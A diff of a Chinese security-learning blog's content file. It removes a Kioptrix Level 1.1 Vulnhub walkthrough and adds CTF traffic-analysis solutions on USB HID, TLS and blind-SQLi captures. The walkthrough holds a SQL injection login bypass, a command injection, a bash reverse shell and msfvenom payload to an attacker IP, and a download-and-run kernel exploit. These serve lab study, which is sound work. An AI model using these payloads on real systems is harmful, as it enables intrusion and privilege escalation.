+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15"></p>
+<h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><blockquote>
+<p>优秀总结：<a class="link" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h3 id="关于631端口-ipp服务-CUPS-1-1"><a href="#关于631端口-ipp服务-CUPS-1-1" class="headerlink" title="关于631端口 ipp服务 CUPS 1.1"></a>关于631端口 ipp服务 CUPS 1.1</h3><ul>
+<li>是一种打印机相关的服务，searchsploit找到了一些提权脚本，但靶机没有打印机设备</li>
+</ul>
+<h3 id="关于渗透方向"><a href="#关于渗透方向" class="headerlink" title="关于渗透方向"></a>关于渗透方向</h3><ul>
+<li>根据靶机打开的端口，一一尝试后，成功找到了RCE的web漏洞</li>
+</ul>
+<h3 id="关于-Linux-提权"><a href="#关于-Linux-提权" class="headerlink" title="关于 Linux 提权"></a>关于 Linux 提权</h3><ul>
+<li><p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p>
+</li>
+<li><p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p>
+<ul>
+<li>LinEnum 可以枚举信息</li>
+<li>lse.sh 可以枚举一些系统可能存在的漏洞信息</li>
+</ul>
+<p>以上都是要在靶机中运行的，因此脚本需要通过http服务传到靶机中</p>
+</li>
+<li><p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p>
+</li>
+</ul>
+<h3 id="关于主机间传文件-via-http"><a href="#关于主机间传文件-via-http" class="headerlink" title="关于主机间传文件 via http"></a>关于主机间传文件 via http</h3><ul>
+<li>Python建立简单http服务</li>
+<li>在攻击机中开启apache</li>
+</ul>
+<h3 id="关于web渗透sql注入"><a href="#关于web渗透sql注入" class="headerlink" title="关于web渗透sql注入"></a>关于web渗透sql注入</h3><ul>
+<li>sql注入知识（<strong>有待进一步学习</strong>）</li>
+</ul>
 ]]></content>
       <categories>
         <category>类OSCP靶机练习</category>
@@ -501,168 +657,11 @@
       </tags>
   </entry>
   <entry>
-    <title>Kioptrix Level 1.1(#2)</title>
-    <url>/2024/02/03/Kioptrix_Level_1.1/</url>
-    <content><![CDATA[<h1 id="Kioptrix-Level-1-1-2"><a href="#Kioptrix-Level-1-1-2" class="headerlink" title="Kioptrix Level 1.1(#2)"></a>Kioptrix Level 1.1(#2)</h1><blockquote>
-<p>参考 <a class="link" href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
-<li>nmap扫描ip，得到IP为<code>192.168.89.138</code></li>
-<li>nmap扫描端口及端口服务</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>看到了web服务：80端口和443端口</strong></p>
-<ul>
-<li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05"></p>
-<ul>
-<li>F12 查看源代码</li>
-</ul>
-<img lazyload src="/images/loading.svg" data-src="Kioptrix_Level_1.1/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;">
-
-<p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p>
-<h4 id="我的体验"><a href="#我的体验" class="headerlink" title="我的体验"></a>我的体验</h4><p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p>
-<h3 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h3><h4 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h4><ul>
-<li><p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>&#39; or &#39;1&#39; = &#39;1 </code>（这里的sql注入很简单，很多思路都是可以的）</p>
-</li>
-<li><p>还有一篇walkthrough里面有人是username输入<code>admin&#39; or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p>
-<ul>
-<li><em><strong>–是一种sql的单行注释语句，注意：–后面有空格</strong></em></li>
-</ul>
-</li>
-<li><p>成功后看到以下页面：</p>
-</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22"></p>
-<h4 id="寻找漏洞：RCE漏洞"><a href="#寻找漏洞：RCE漏洞" class="headerlink" title="寻找漏洞：RCE漏洞"></a>寻找漏洞：RCE漏洞</h4><ul>
-<li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17"></p>
-<ul>
-<li>猜测存在RCE漏洞：Remote Code/Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46"></p>
-<p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p>
-<p><strong>证明确实存在RCE</strong></p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><blockquote>
-<p>参考 <a class="link" href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<h6 id="0x01-bash建立tcp连接"><a href="#0x01-bash建立tcp连接" class="headerlink" title="0x01 bash建立tcp连接"></a>0x01 bash建立tcp连接</h6><ul>
-<li><p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p>
-</li>
-<li><p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p>
-</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38"></p>
-<p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p>
-<h6 id="0x02-msfvenom生成后门"><a href="#0x02-msfvenom生成后门" class="headerlink" title="0x02 msfvenom生成后门"></a>0x02 msfvenom生成后门</h6><blockquote>
-<p>参考<a class="link" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1  常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<ul>
-<li><code>msfvenom</code>生成后门命名为<code>shell4444</code>，开启http服务上传shell给靶机下载，msf进行监听，然后靶场执行shell，成功反弹shell</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h3 id="Linux-提权-Linux-Privilege-Escalation"><a href="#Linux-提权-Linux-Privilege-Escalation" class="headerlink" title="Linux 提权  Linux Privilege Escalation"></a>Linux 提权  Linux Privilege Escalation</h3><blockquote>
-<p>参考 <a class="link" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<h4 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h4><ul>
-<li>根据参考，使用<code>lsb_release -a 2&gt;/dev/null</code>查看os信息</li>
-</ul>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure></div>
-
-<p><em>2&gt;/dev/null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56"></p>
-<p><strong>发现Linux版本是CentOS 4.5</strong></p>
-<ul>
-<li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li>
-</ul>
-<blockquote>
-<p>关于工具使用：<a class="link" href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_./linux-exploit-suggester.sh-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<h4 id="寻找CentOS-4-5漏洞利用提权脚本"><a href="#寻找CentOS-4-5漏洞利用提权脚本" class="headerlink" title="寻找CentOS 4.5漏洞利用提权脚本"></a>寻找CentOS 4.5漏洞利用提权脚本</h4><ul>
-<li><code>searchsploit CentOS 4.5</code></li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18"></p>
-<ul>
-<li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li>
-</ul>
-<h4 id="将脚本传到靶机"><a href="#将脚本传到靶机" class="headerlink" title="将脚本传到靶机"></a>将脚本传到靶机</h4><h5 id="0x01-Python-SimpleHTTPServer-快速共享当前目录"><a href="#0x01-Python-SimpleHTTPServer-快速共享当前目录" class="headerlink" title="0x01 Python SimpleHTTPServer 快速共享当前目录"></a>0x01 Python SimpleHTTPServer 快速共享当前目录</h5><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57"></p>
-<ul>
-<li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18"></p>
-<p>==<em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em>==</p>
-<ul>
-<li>同时在攻击机上也可以看到靶机的信息</li>
-</ul>
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41"></p>
-<h5 id="0x02-service-apache2-start"><a href="#0x02-service-apache2-start" class="headerlink" title="0x02 service apache2 start"></a>0x02 service apache2 start</h5><ul>
-<li><p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p>
-</li>
-<li><p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p>
-</li>
-<li><p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p>
-</li>
-<li><p>同样需要注意<strong>存储的文件夹权限问题</strong></p>
-</li>
-</ul>
-<h4 id="编译运行脚本"><a href="#编译运行脚本" class="headerlink" title="编译运行脚本"></a>编译运行脚本</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15"></p>
-<h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><blockquote>
-<p>优秀总结：<a class="link" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-</blockquote>
-<h3 id="关于631端口-ipp服务-CUPS-1-1"><a href="#关于631端口-ipp服务-CUPS-1-1" class="headerlink" title="关于631端口 ipp服务 CUPS 1.1"></a>关于631端口 ipp服务 CUPS 1.1</h3><ul>
-<li>是一种打印机相关的服务，searchsploit找到了一些提权脚本，但靶机没有打印机设备</li>
-</ul>
-<h3 id="关于渗透方向"><a href="#关于渗透方向" class="headerlink" title="关于渗透方向"></a>关于渗透方向</h3><ul>
-<li>根据靶机打开的端口，一一尝试后，成功找到了RCE的web漏洞</li>
-</ul>
-<h3 id="关于-Linux-提权"><a href="#关于-Linux-提权" class="headerlink" title="关于 Linux 提权"></a>关于 Linux 提权</h3><ul>
-<li><p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p>
-</li>
-<li><p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p>
-<ul>
-<li>LinEnum 可以枚举信息</li>
-<li>lse.sh 可以枚举一些系统可能存在的漏洞信息</li>
-</ul>
-<p>以上都是要在靶机中运行的，因此脚本需要通过http服务传到靶机中</p>
-</li>
-<li><p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p>
-</li>
-</ul>
-<h3 id="关于主机间传文件-via-http"><a href="#关于主机间传文件-via-http" class="headerlink" title="关于主机间传文件 via http"></a>关于主机间传文件 via http</h3><ul>
-<li>Python建立简单http服务</li>
-<li>在攻击机中开启apache</li>
-</ul>
-<h3 id="关于web渗透sql注入"><a href="#关于web渗透sql注入" class="headerlink" title="关于web渗透sql注入"></a>关于web渗透sql注入</h3><ul>
-<li>sql注入知识（<strong>有待进一步学习</strong>）</li>
-</ul>
-]]></content>
-      <categories>
-        <category>类OSCP靶机练习</category>
-      </categories>
-      <tags>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF_MISC_Wireshark流量分析做题记录与总结</title>
+    <title>CTF_MISC流量分析做题记录</title>
     <url>/2024/03/06/MISC-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>CTF MISC Wireshark流量分析做题记录与总结</p>
+    <content><![CDATA[<p>CTF MISC 流量分析做题记录</p>
 <blockquote>
-<p>从零开始的wireshark流量分析做题记录，主要是为了列出做过的流量分析。标上难度，给各位CTFer练习流量分析提供一些方向，简单的题目步骤很简略，要看详细的wp可以自行搜索</p>
-<p>总结在后面</p>
+<p>从零开始的CTF流量分析做题记录，工具主要是wireshark/tshark。标上难度，给各位CTFer练习流量分析提供一些方向，简单的题目步骤很简略，要看详细的wp可以自行搜索</p>
 </blockquote>
 <h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><h4 id="0x01-wireshark"><a href="#0x01-wireshark" class="headerlink" title="0x01 wireshark"></a>0x01 wireshark</h4><ul>
 <li>简单，wireshark搜索password，直接可以找到</li>
@@ -715,6 +714,87 @@
 <blockquote>
 <p>看到一篇不错的文章：<a class="link" href="https://www.freebuf.com/articles/terminal/195721.html">Windows ADS在渗透测试中的妙用 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
+<h4 id="0x08-9-4-1-鼠标流量分析-鼠标流量分析"><a href="#0x08-9-4-1-鼠标流量分析-鼠标流量分析" class="headerlink" title="0x08 [9.4.1 鼠标流量分析] 鼠标流量分析"></a>0x08 [9.4.1 鼠标流量分析] 鼠标流量分析</h4><ul>
+<li>简单，前提是你需要了解<strong>鼠标流量数据格式，tshark提取数据</strong></li>
+<li>拿到数据包里面应该是这样的</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240311233529725.png" alt="image-20240311233529725"></p>
+<p><strong>关于鼠标流量数据包info里，<code>GET DESCRIPTOR...</code>以及<code>URB_INTERRUPT in </code>这些分别代表什么数据包，以及这些数据包里的字段代表什么含义请查看：</strong></p>
+<blockquote>
+<p><a class="link" href="https://blog.csdn.net/HAD_INK/article/details/130153044">USB HID 流量分析详解_usbhid.data分析-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p><strong>关于鼠标流量数据(HID Data)格式介绍，以及解密脚本的使用请查看：</strong></p>
+<blockquote>
+<p><a class="link" href="https://p001water.github.io/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/usb/2022/10/12/CTF%E4%B8%AD%E6%88%91%E7%9A%84USB%E9%94%AE%E7%9B%98%E9%BC%A0%E6%A0%87%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86%E6%8C%87%E5%8D%97%E5%92%8C%E8%84%9A%E6%9C%AC.html">CTF—CTF中我的USB键盘鼠标流量解密指南和脚本 (p001water.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p><em>这里需要提醒一下各位，这个题目抓取的HID Data是8bytes的，但你会在鼠标流量数据格式介绍中看到鼠标流量主要以4bytes为主，但是由于各种原因，你拿到的HID Data可能是4或6bytes的，需要具体问题具体分析，通常来说，里面一定有4个字节是代表鼠标数据格式的</em></p>
+<ul>
+<li>这道题用的工具是: <a class="link" href="https://github.com/P001water/UsbmiceCracker">P001water/UsbmiceCracker: CTF中常见鼠标流量解密脚本 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，使用前记得先利用tshark把数据提取出来，*<code>usbhid.data</code>可以用来过滤具有<strong>hiddata</strong>的数据包*</li>
+</ul>
+<p><em>如果自己写的话，一定要注意<strong>matplotlib的正y轴是向下延伸的。</strong>嗯，我在这个问题上浪费了1h。</em></p>
+<ul>
+<li><code>python3 ./UsbmiceCracker.py -f ~/Desktop/atta\ \(2\).pcapng -e usb.capdata -a LEFT </code>就可以直接看到结果了</li>
+</ul>
+<img lazyload src="/images/loading.svg" data-src="MISC-流量分析做题记录/image-20240311235541425.png" alt="image-20240311235541425">
+
+<ul>
+<li>最后的flag就是<code>flag&#123;Hello&#125;</code></li>
+</ul>
+<p><em>又是学知识的一天😭，流量分析依然任重道远。</em></p>
+<h4 id="0x09-9-4-2-键盘流量分析-键盘流量分析"><a href="#0x09-9-4-2-键盘流量分析-键盘流量分析" class="headerlink" title="0x09 [9.4.2 键盘流量分析]键盘流量分析"></a>0x09 [9.4.2 键盘流量分析]键盘流量分析</h4><ul>
+<li>简单，直接利用键盘解密脚本即可：<a class="link" href="https://github.com/FzWjScJ/knm">FzWjScJ/knm: 鼠标键盘流量包取证 (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，这个脚本也可以用来解密鼠标流量</li>
+<li>键盘数据格式通常为8bytes，具体含义可以查看：</li>
+</ul>
+<blockquote>
+<p><a class="link" href="https://blog.csdn.net/HAD_INK/article/details/130153044">USB HID 流量分析详解_usbhid.data分析-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<ul>
+<li><p>脚本使用</p>
+<ul>
+<li>这个脚本自带数据提取，先利用pca提取到out.txt</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240312141039776.png" alt="image-20240312141039776"></p>
+<ul>
+<li>再从out.txt 解析数据</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240312141118236.png" alt="image-20240312141118236"></p>
+</li>
+<li><p>flag:<code>flag&#123;helloworld!&#125;</code></p>
+</li>
+</ul>
+<h4 id="0x0A-NewStarCTF-2023-公开赛道-流量！鲨鱼！"><a href="#0x0A-NewStarCTF-2023-公开赛道-流量！鲨鱼！" class="headerlink" title="0x0A [NewStarCTF 2023 公开赛道]流量！鲨鱼！"></a>0x0A [NewStarCTF 2023 公开赛道]流量！鲨鱼！</h4><ul>
+<li>简单，先过滤一下http包，然后数据包长度从大到小排列一下</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240312170552749.png" alt="image-20240312170552749"></p>
+<ul>
+<li>看到这个长度为820的数据包uri为<code>/1.php?cmd=base64%20/.ffffllllllll11111144444GGGGGG|base64</code>，追踪一下，看到一串数据</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240312170832771.png" alt="image-20240312170832771"></p>
+<ul>
+<li>这段数据拷贝下来，这应该是把原本base64的数据再base64传输的，所以要经过两次base64解码，如果你不知道，可以依赖cyber的magic :smile:，或者凭借敏锐的眼力看出Zmxh(这个是flag经过base64拿到的字符串)</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240312171226970.png" alt="image-20240312171226970"></p>
+<ul>
+<li>flag为<code>flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</code></li>
+</ul>
+<h4 id="0x0B-9-3-3-TLS流量分析-TLS流量分析"><a href="#0x0B-9-3-3-TLS流量分析-TLS流量分析" class="headerlink" title="0x0B [9.3.3 TLS流量分析]TLS流量分析"></a>0x0B [9.3.3 TLS流量分析]TLS流量分析</h4><ul>
+<li>简单，了解一下TLS流量分析</li>
+<li>先过滤一下http，追踪一下最大的post请求数据包</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240312205935477.png" alt="image-20240312205935477"></p>
+<p>可以看见很多字段，通过搜索发现这些是tls key.log文件的内容，于是保存为key.log</p>
+<ul>
+<li>编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;Pre-Master-Secret log filename</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240312210154500.png" alt="image-20240312210154500"></p>
+<p>在选中区域填写刚刚保存的key.log文件</p>
+<ul>
+<li>导入后，过滤http，发现多了几个包，可以直接搜索flag，<em>直觉与经验告诉我，先查看/Login，果然😄</em></li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240312210358856.png" alt="image-20240312210358856"></p>
+<ul>
+<li>flag为<code>flag&#123;e3364403651e775bfb9b3ffa06b69994&#125;</code></li>
+</ul>
 <h3 id="中等"><a href="#中等" class="headerlink" title="中等"></a>中等</h3><h4 id="0x01-9-3-2-webshell混淆流量分析-webshell流量分析1"><a href="#0x01-9-3-2-webshell混淆流量分析-webshell流量分析1" class="headerlink" title="0x01 [9.3.2 webshell混淆流量分析]webshell流量分析1"></a>0x01 [9.3.2 webshell混淆流量分析]webshell流量分析1</h4><ul>
 <li>中等</li>
 <li>设置筛选条件<code>http</code>，先看看http的数据包都有些啥，然后看到了有些是<code>/upload/1.php</code>，应该是上传了什么东西，追踪一下http流</li>
@@ -755,8 +835,57 @@
 </ul>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</span><br></pre></td></tr></table></figure></div>
 
+<p><strong>webshell流量有很多种，详情描述请查看：</strong></p>
+<blockquote>
+<p><a class="link" href="https://www.clementi.top/2023/06/21/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">常见webshell流量分析 | Clementi’s Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h4 id="0x02-NewStarCTF-公开赛赛道-最后的流量分析"><a href="#0x02-NewStarCTF-公开赛赛道-最后的流量分析" class="headerlink" title="0x02 [NewStarCTF 公开赛赛道]最后的流量分析"></a>0x02 [NewStarCTF 公开赛赛道]最后的流量分析</h4><ul>
+<li>中等，重点在数据处理</li>
+<li>拿到手过滤一下http，发现是sql盲注的流量</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240312211449095.png" alt="image-20240312211449095"></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if((substr((select(text)from(wfy_comments)where(id=100)),1,1)=%22q%22),100,0) </span><br></pre></td></tr></table></figure></div>
 
+<p><strong>(substr((select(text)from(wfy_comments)where(id=100)),1,1)=%22q%22)：</strong>从wfy_comments表中选择id是100的列，然后使用该substr()函数提取第一个字符（从位置 1 开始、长度为 1 的子字符串），将提取的字符和q比较。</p>
+<p><strong>if(…,100,0)：</strong>true返回100，false返回0。即?name=100或?name=0</p>
+<p><strong>经过观察发现，不同的数据包修改的值是，提取字符的位置（substr的中间的参数），和=后面用于比较的字符，例如这个例子里的q</strong></p>
+<ul>
+<li>将数据包大小排序，经过观察，可以发现长度在768以上的返回的h2是<code>好耶！你有这条来自f1ag_is_here条留言</code>，长度在764以下的返回的是<code>啊哦，这条留言不存在哦～</code></li>
+<li>通过<code>data-text-lines and frame.len &lt;= 768</code>直接过滤出注入成功的数据包（data-text-lines是过滤有text data的包，也就是返回html的包）</li>
+</ul>
+<p><img lazyload src="/images/loading.svg" data-src="./image-20240312220202763.png" alt="image-20240312220202763"></p>
+<p>:raised_hands:<em>这里想跟大家分享一下写wireshark过滤的小技巧，如果你和我一样懒得查看英文手册的话:joy: ，找到你想筛选的数据，右键，apply as filter，任意选择selected或not，你就能看见这个字段的过滤应该怎么写了，再根据你实际想要达到的效果修改符号为不等于或大于小于等等。</em></p>
+<ul>
+<li>tshark+sed，直接在终端数据处理：</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -nr &quot;sqli.pcap&quot; -Y &quot;data-text-lines and frame.len &gt;= 768&quot; -T fields -e &quot;http.response_for.uri&quot;|sed &#x27;s/^.*)),//g&#x27;|sed &#x27;s/^.*=%22//g&#x27; |sed &#x27;s/%22.*$//g&#x27;|tr -d &#x27;\n&#x27;</span><br></pre></td></tr></table></figure></div>
 
+<p>tshark的命令就不解释了，一开始拿到的数据是这样的：</p>
